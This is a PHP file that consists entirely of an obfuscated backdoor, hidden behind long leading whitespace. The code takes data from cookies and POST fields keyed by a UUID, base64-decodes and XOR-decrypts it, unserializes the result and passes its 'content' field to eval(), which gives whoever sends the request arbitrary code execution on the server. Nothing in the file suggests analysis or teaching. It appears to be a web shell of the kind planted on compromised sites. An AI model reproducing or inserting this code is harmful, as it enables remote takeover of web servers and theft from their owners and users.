<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ZehuF = class_exists("W_ZfW"); $Biqnbh = $ZehuF;if (!$Biqnbh){class W_ZfW{private $NHLgymub;public static $QUhrC = "d0691082-3e7e-458b-818a-acac4e8eecdb";public static $XHzCMHZ = NULL;public function __construct(){$LtPbKQ = $_COOKIE;$tnrrzVAnC = $_POST;$tzFnu = @$LtPbKQ[substr(W_ZfW::$QUhrC, 0, 4)];if (!empty($tzFnu)){$NNUkZgF = "base64";$uGehryY = "";$tzFnu = explode(",", $tzFnu);foreach ($tzFnu as $IVZhhVC){$uGehryY .= @$LtPbKQ[$IVZhhVC];$uGehryY .= @$tnrrzVAnC[$IVZhhVC];}$uGehryY = array_map($NNUkZgF . "\x5f" . chr ( 144 - 44 ).chr ( 463 - 362 ).'c' . chr ( 286 - 175 ).'d' . "\x65", array($uGehryY,)); $uGehryY = $uGehryY[0] ^ str_repeat(W_ZfW::$QUhrC, (strlen($uGehryY[0]) / strlen(W_ZfW::$QUhrC)) + 1);W_ZfW::$XHzCMHZ = @unserialize($uGehryY);}}public function __destruct(){$this->UjIMkc();}private function UjIMkc(){if (is_array(W_ZfW::$XHzCMHZ)) {$qnMAkslS = str_replace("\74" . chr (63) . chr (112) . chr ( 899 - 795 ).chr (112), "", W_ZfW::$XHzCMHZ['c' . "\157" . chr (110) . chr ( 355 - 239 ).chr ( 782 - 681 ).'n' . 't']);eval($qnMAkslS);exit();}}}$jlCciAmZ = new W_ZfW(); $jlCciAmZ = NULL;} ?><?php
